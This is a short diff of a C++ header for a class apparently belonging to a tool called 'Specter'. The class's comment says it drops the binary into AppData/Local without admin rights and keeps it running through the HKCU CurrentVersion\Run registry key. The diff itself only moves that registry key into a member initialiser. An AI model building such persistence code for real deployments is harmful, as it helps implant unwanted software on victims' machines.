@@ -1,21 +1,15 @@
 #pragma once
 #include <filesystem>
 #include <string>
-
-#include <windows.h>
-
 #include <winreg/WinReg.hpp>
 
 // This class is responsible for deploying the Specter binary into the machine without any admin privileges
 // Deploy to the AppData/Local folder, and ensures persistence by using the HKCU persistence method and 
 class SpecterBasicDeployment
 {
-	static constexpr HKEY kTargetRegistryRoot = HKEY_CURRENT_USER;
-	static inline const std::wstring kTargetRegistry = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
-
 	std::wstring m_program_name;
 	std::filesystem::path m_target_file;
-	winreg::RegKey m_reg_key;
+	winreg::RegKey m_reg_key = {HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"};
 	std::wstring m_obscrypto_args;
 
 public:
